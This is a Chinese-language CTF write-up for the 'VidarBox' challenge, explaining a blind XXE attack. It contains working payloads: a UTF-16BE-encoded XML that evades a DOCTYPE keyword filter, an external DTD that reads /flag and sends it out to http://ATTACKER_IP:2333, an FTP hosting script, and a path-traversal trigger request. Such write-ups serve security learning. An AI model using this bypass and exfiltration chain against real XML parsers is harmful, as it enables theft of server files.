# VidarBox

## 题目简述

题目的 `/backdoor` 接口会让服务端获取并解析攻击者控制的 XML，但普通编码的 `DOCTYPE` 会被过滤。利用链是：通过路径参数让服务端加载外部 XML；把 XML 整体编码为 UTF-16BE 绕过关键字过滤；再通过外部参数实体读取 `/flag`，将内容以带外 HTTP 请求发送到攻击者服务器。

这是无回显 XXE。题目所给链路还需要在公网 VPS 上提供匿名 FTP/静态文件服务，使靶机能够取得恶意 XML 和 DTD。

## 解题过程

### 准备外部文件服务

官方题解使用 `pyftpdlib` 在 VPS 的 21 端口开放 `/var/www/html`：

```python
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

authorizer = DummyAuthorizer()
authorizer.add_anonymous("/var/www/html", perm="r")

handler = FTPHandler
handler.authorizer = authorizer

server = FTPServer(("0.0.0.0", 21), handler)
server.serve_forever()
```

同时应确保 XML 中引用的 `http://ATTACKER_IP/evil.dtd` 可由靶机访问，并在 2333 端口监听回连。`ATTACKER_IP` 必须替换为自己的公网地址。

### 构造 UTF-16BE XML

逻辑上的 XML 内容只有两行：

```xml
<?xml version="1.0" encoding="UTF-16BE"?>
<!DOCTYPE foo SYSTEM "http://ATTACKER_IP/evil.dtd">
```

关键是文件本体也必须按 UTF-16BE 写出，不能只改声明。下面的生成方式与官方 Java 代码等价：

```python
xml = """<?xml version="1.0" encoding="UTF-16BE"?>
<!DOCTYPE foo SYSTEM "http://ATTACKER_IP/evil.dtd">"""

with open("payload", "wb") as output:
    output.write(xml.encode("utf-16-be"))
```

UTF-16BE 使敏感关键字在字节层面被零字节隔开，从而绕过只针对普通 ASCII/UTF-8 文本的过滤；XML 解析器仍会依据声明正确解码并处理 `DOCTYPE`。

### 外部 DTD 与带外回显

VPS 上的 `evil.dtd` 内容如下：

```xml
<!ENTITY % payload SYSTEM "file:///flag">
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://ATTACKER_IP:2333/%payload;'>">
%int;
%trick;
```

第一行把 `/flag` 读入参数实体 `%payload;`。第二行通过字符实体 `&#37;` 动态声明另一个参数实体 `%trick;`，其系统标识符包含文件内容；展开 `%trick;` 时，解析器向攻击者的 2333 端口发出请求，flag 便出现在请求路径中。

按官方环境的路由方式，用以下请求让后端取得并解析公网服务器上的 `payload`：

```http
GET /backdoor?fname=../../ATTACKER_IP/payload HTTP/1.1
Host: localhost:8081
```

实际比赛中该 URL 是从题目提供的服务入口触发，`localhost:8081` 表示后端内部监听地址；复现时应替换外层 Host，但保留题目要求的 `fname` 结构。监听端收到的请求路径即包含 `/flag` 内容。

官方 PDF 没有记录最终 flag 字符串，也没有保留在线环境，因此这里不猜测具体值。

## 方法总结

- 无回显 XXE 的关键是把本地文件内容嵌入外部请求，而不是期待响应正文直接显示实体。
- 绕过关键字过滤时，XML 声明与真实字节编码必须一致；只写 `encoding="UTF-16BE"` 而仍保存为 UTF-8 不会奏效。
- 外部 DTD 采用“参数实体中再声明参数实体”的写法，是为了让读取到的文件内容参与系统标识符展开。
- 复现前应分别验证文件托管端口、DTD URL、带外监听端口和靶机出网能力，避免把网络问题误判为 payload 错误。
